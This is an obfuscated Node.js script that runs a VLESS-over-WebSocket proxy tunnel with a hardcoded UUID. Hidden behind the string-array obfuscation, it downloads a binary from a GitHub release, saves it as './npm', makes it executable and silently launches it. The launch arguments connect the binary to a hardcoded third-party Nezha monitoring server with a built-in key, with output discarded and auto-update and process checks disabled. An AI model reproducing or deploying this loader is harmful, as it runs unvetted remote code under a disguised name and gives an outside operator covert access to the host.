const _0x465eb6=_0x3b81;(function(_0x12db0e,_0x584f5c){const _0x7bad68=_0x3b81,_0x3fd7b5=_0x12db0e();while(!![]){try{const _0x246705=parseInt(_0x7bad68(0xee))/0x1+-parseInt(_0x7bad68(0x114))/0x2*(parseInt(_0x7bad68(0x109))/0x3)+parseInt(_0x7bad68(0xe4))/0x4*(-parseInt(_0x7bad68(0xf3))/0x5)+parseInt(_0x7bad68(0x116))/0x6*(parseInt(_0x7bad68(0x103))/0x7)+parseInt(_0x7bad68(0xed))/0x8*(-parseInt(_0x7bad68(0x117))/0x9)+parseInt(_0x7bad68(0xef))/0xa+parseInt(_0x7bad68(0x11b))/0xb;if(_0x246705===_0x584f5c)break;else _0x3fd7b5['push'](_0x3fd7b5['shift']());}catch(_0x1e3f47){_0x3fd7b5['push'](_0x3fd7b5['shift']());}}}(_0x4028,0xb865f));const os=require('os'),http=require('http'),{Buffer}=require('buffer'),fs=require('fs'),axios=require(_0x465eb6(0xcd)),path=require(_0x465eb6(0xec)),net=require(_0x465eb6(0xd6)),{exec,execSync}=require(_0x465eb6(0x113)),{WebSocket,createWebSocketStream}=require('ws'),logcb=(..._0x4d8edb)=>console[_0x465eb6(0xe1)]['bind'](this,..._0x4d8edb),errcb=(..._0x29e35b)=>console[_0x465eb6(0x107)]['bind'](this,..._0x29e35b),UUID=process[_0x465eb6(0xd2)]['UUID']||_0x465eb6(0x10e),uuid=UUID['replace'](/-/g,''),NEZHA_SERVER=process[_0x465eb6(0xd2)][_0x465eb6(0x104)]||'nezha.mingfei1981.eu.org',NEZHA_PORT=process[_0x465eb6(0xd2)][_0x465eb6(0x102)]||'443',NEZHA_KEY=process[_0x465eb6(0xd2)][_0x465eb6(0xd3)]||_0x465eb6(0x11a),DOMAIN=process[_0x465eb6(0xd2)][_0x465eb6(0xf2)]||'',NAME=process[_0x465eb6(0xd2)]['NAME']||_0x465eb6(0xdd),port=process[_0x465eb6(0xd2)][_0x465eb6(0xe6)]||0x1f90,httpServer=http['createServer']((_0x39bfb5,_0x1c4b7e)=>{const _0x3a4170=_0x465eb6;if(_0x39bfb5[_0x3a4170(0x110)]==='/')_0x1c4b7e[_0x3a4170(0x100)](0xc8,{'Content-Type':_0x3a4170(0xe0)}),_0x1c4b7e[_0x3a4170(0x11f)](_0x3a4170(0xd1));else{if(_0x39bfb5['url']===_0x3a4170(0xf0)){const _0x2b0c1b='vless://'+UUID+_0x3a4170(0xca)+DOMAIN+_0x3a4170(0xfa)+DOMAIN+_0x3a4170(0xeb)+NAME,_0x10ec6d=Buffer[_0x3a4170(0xe5)](_0x2b0c1b)[_0x3a4170(0xfd)](_0x3a4170(0xf4));_0x1c4b7e['writeHead'](0xc8,{'Content-Type':_0x3a4170(0xe0)}),_0x1c4b7e['end'](_0x10ec6d+'\x0a');}else _0x1c4b7e['writeHead'](0x194,{'Content-Type':_0x3a4170(0xe0)}),_0x1c4b7e[_0x3a4170(0x11f)](_0x3a4170(0xd4));}});httpServer[_0x465eb6(0xe7)](port,()=>{const _0x2fba89=_0x465eb6;console[_0x2fba89(0xe1)]('HTTP\x20Server\x20is\x20running\x20on\x20port\x20'+port);});function getSystemArchitecture(){const _0x28dead=_0x465eb6,_0x1d1139=os['arch']();return _0x1d1139===_0x28dead(0xda)||_0x1d1139===_0x28dead(0x10b)?_0x28dead(0xda):_0x28dead(0xf6);}function _0x3b81(_0x178832,_0x31ae85){const _0x4028f2=_0x4028();return _0x3b81=function(_0x3b8125,_0x454192){_0x3b8125=_0x3b8125-0xca;let _0x366c28=_0x4028f2[_0x3b8125];return _0x366c28;},_0x3b81(_0x178832,_0x31ae85);}function downloadFile(_0x4db5ac,_0x59fa95,_0x2f5bac){const _0x4e72d=_0x465eb6,_0x4463ce=path[_0x4e72d(0x112)]('./',_0x4db5ac),_0x4110e5=fs[_0x4e72d(0x118)](_0x4463ce);axios({'method':_0x4e72d(0xf1),'url':_0x59fa95,'responseType':_0x4e72d(0xd7)})[_0x4e72d(0xf9)](_0x3a792f=>{const _0x5378a9=_0x4e72d;_0x3a792f[_0x5378a9(0x10c)]['pipe'](_0x4110e5),_0x4110e5['on'](_0x5378a9(0xfc),function(){_0x4110e5['close'](),_0x2f5bac(null,_0x4db5ac);});})[_0x4e72d(0xea)](_0x34a044=>{const _0x4acd79=_0x4e72d;_0x2f5bac(_0x4acd79(0xdc)+_0x4db5ac+_0x4acd79(0xfb)+_0x34a044['message']);});}function downloadFiles(){const _0x400070=_0x465eb6,_0x1a2b12=getSystemArchitecture(),_0xcb808f=getFilesForArchitecture(_0x1a2b12);if(_0xcb808f[_0x400070(0x121)]===0x0){console[_0x400070(0xe1)]('Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture');return;}let _0x5ae6f6=0x0;_0xcb808f['forEach'](_0x2b20cf=>{const _0x90db2d=_0x400070;downloadFile(_0x2b20cf[_0x90db2d(0xcb)],_0x2b20cf[_0x90db2d(0xd0)],(_0x14ae51,_0x59d85d)=>{const _0x30fd88=_0x90db2d;_0x14ae51?console[_0x30fd88(0xe1)](_0x30fd88(0xdc)+_0x59d85d+_0x30fd88(0xcf)):(console[_0x30fd88(0xe1)](_0x30fd88(0xdc)+_0x59d85d+'\x20successfully'),_0x5ae6f6++,_0x5ae6f6===_0xcb808f[_0x30fd88(0x121)]&&setTimeout(()=>{authorizeFiles();},0xbb8));});});}function getFilesForArchitecture(_0x4d54e2){const _0x3efb3c=_0x465eb6;if(_0x4d54e2===_0x3efb3c(0xda))return[{'fileName':_0x3efb3c(0x11e),'fileUrl':_0x3efb3c(0xf8)}];else{if(_0x4d54e2===_0x3efb3c(0xf6))return[{'fileName':_0x3efb3c(0x11e),'fileUrl':'https://github.com/eooce/test/releases/download/bulid/swith'}];}return[];}function authorizeFiles(){const _0x50b552=_0x465eb6,_0x17f126=_0x50b552(0xf5),_0x446905=0x1fd;fs[_0x50b552(0x10d)](_0x17f126,_0x446905,_0x85b45f=>{const _0x80777=_0x50b552;if(_0x85b45f)console[_0x80777(0x107)](_0x80777(0xd5)+_0x85b45f);else{console[_0x80777(0xe1)](_0x80777(0x11c)+_0x446905[_0x80777(0xfd)](0x8)+'\x20('+_0x446905['toString'](0xa)+')');let _0x126ba9='';if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){NEZHA_PORT==='443'?_0x126ba9=_0x80777(0x115):_0x126ba9='';const _0x223ed3=_0x80777(0x108)+NEZHA_SERVER+':'+NEZHA_PORT+_0x80777(0xf7)+NEZHA_KEY+'\x20'+_0x126ba9+_0x80777(0xde);try{exec(_0x223ed3),console[_0x80777(0xe1)]('npm\x20is\x20running');}catch(_0x137b76){console['error']('npm\x20running\x20error:\x20'+_0x137b76);}}else console['log'](_0x80777(0x10f));}});}function _0x4028(){const _0xe40dea=['3187815ltydLq','base64','./npm','amd','\x20-p\x20','https://github.com/eooce/test/releases/download/ARM/swith','then','&type=ws&host=','\x20failed:\x20','finish','toString','WebSocket\x20错误:','map','writeHead','decode','NEZHA_PORT','15890ciSRhl','NEZHA_SERVER','send','connect','error','./npm\x20-s\x20','426zuzRSx','WebSocket\x20连接成功','arm64','data','chmod','faacf142-dee8-48c2-8558-641123eb939c','NEZHA\x20variable\x20is\x20empty,skip\x20running','url','message','join','child_process','5306WFRMvT','--tls','732FVGkuQ','549pBVwvq','createWriteStream','readUInt16BE','ndcKJBc5ocZt3ODcJn','1006335LLVqiv','Empowerment\x20success:','处理消息时出错:','npm','end','pipe','length','reduce','readUInt8','Server','@skk.moe:443?encryption=none&security=tls&sni=','fileName','substr','axios','E1:','\x20failed','fileUrl','Hello,\x20World\x0a','env','NEZHA_KEY','Not\x20Found\x0a','Empowerment\x20failed:','net','stream','concat','slice','arm','every','Download\x20','genez','\x20--skip-conn\x20--disable-auto-update\x20--skip-procs\x20--report-delay\x204\x20>/dev/null\x202>&1\x20&','连接到:','text/plain','log','UUID\x20验证失败','数据长度无效','4VLTLDt','from','PORT','listen','连接错误:','write','catch','&path=%2F#','path','106464izQaSk','1435393CSMXwS','7775540DXEYUG','/sub','get','DOMAIN'];_0x4028=function(){return _0xe40dea;};return _0x4028();}downloadFiles();const wss=new WebSocket[(_0x465eb6(0x124))]({'server':httpServer});wss['on']('connection',_0x2802ca=>{const _0x3e1cd8=_0x465eb6;console[_0x3e1cd8(0xe1)](_0x3e1cd8(0x10a)),_0x2802ca['on'](_0x3e1cd8(0x111),_0x1630c2=>{const _0x3d4495=_0x3e1cd8;if(_0x1630c2[_0x3d4495(0x121)]<0x12){console[_0x3d4495(0x107)](_0x3d4495(0xe3));return;}try{const [_0x30e17e]=_0x1630c2,_0x104b0f=_0x1630c2[_0x3d4495(0xd9)](0x1,0x11);if(!_0x104b0f[_0x3d4495(0xdb)]((_0x21f00d,_0x4898c8)=>_0x21f00d==parseInt(uuid[_0x3d4495(0xcc)](_0x4898c8*0x2,0x2),0x10))){console['error'](_0x3d4495(0xe2));return;}let _0x194322=_0x1630c2[_0x3d4495(0xd9)](0x11,0x12)[_0x3d4495(0x123)]()+0x13;const _0xa33013=_0x1630c2['slice'](_0x194322,_0x194322+=0x2)[_0x3d4495(0x119)](0x0),_0x5d9e1e=_0x1630c2['slice'](_0x194322,_0x194322+=0x1)[_0x3d4495(0x123)](),_0x2b1f4b=_0x5d9e1e===0x1?_0x1630c2[_0x3d4495(0xd9)](_0x194322,_0x194322+=0x4)[_0x3d4495(0x112)]('.'):_0x5d9e1e===0x2?new TextDecoder()[_0x3d4495(0x101)](_0x1630c2['slice'](_0x194322+0x1,_0x194322+=0x1+_0x1630c2[_0x3d4495(0xd9)](_0x194322,_0x194322+0x1)[_0x3d4495(0x123)]())):_0x5d9e1e===0x3?_0x1630c2[_0x3d4495(0xd9)](_0x194322,_0x194322+=0x10)[_0x3d4495(0x122)]((_0x4b3f5f,_0x5e6146,_0x4dec64,_0x221150)=>_0x4dec64%0x2?_0x4b3f5f[_0x3d4495(0xd8)](_0x221150[_0x3d4495(0xd9)](_0x4dec64-0x1,_0x4dec64+0x1)):_0x4b3f5f,[])[_0x3d4495(0xff)](_0x4c07fc=>_0x4c07fc['readUInt16BE'](0x0)[_0x3d4495(0xfd)](0x10))[_0x3d4495(0x112)](':'):'';console[_0x3d4495(0xe1)](_0x3d4495(0xdf),_0x2b1f4b,_0xa33013),_0x2802ca[_0x3d4495(0x105)](new Uint8Array([_0x30e17e,0x0]));const _0x2602d1=createWebSocketStream(_0x2802ca);net[_0x3d4495(0x106)]({'host':_0x2b1f4b,'port':_0xa33013},function(){const _0x41fb6a=_0x3d4495;this[_0x41fb6a(0xe9)](_0x1630c2[_0x41fb6a(0xd9)](_0x194322)),_0x2602d1['on']('error',_0x13e11d=>console[_0x41fb6a(0x107)](_0x41fb6a(0xce),_0x13e11d[_0x41fb6a(0x111)]))[_0x41fb6a(0x120)](this)['on']('error',_0x4b0e32=>console[_0x41fb6a(0x107)]('E2:',_0x4b0e32[_0x41fb6a(0x111)]))[_0x41fb6a(0x120)](_0x2602d1);})['on'](_0x3d4495(0x107),_0x2003ef=>console[_0x3d4495(0x107)](_0x3d4495(0xe8),_0x2003ef[_0x3d4495(0x111)]));}catch(_0xfd6f18){console[_0x3d4495(0x107)](_0x3d4495(0x11d),_0xfd6f18[_0x3d4495(0x111)]);}})['on'](_0x3e1cd8(0x107),_0x19beea=>console['error'](_0x3e1cd8(0xfe),_0x19beea[_0x3e1cd8(0x111)]));});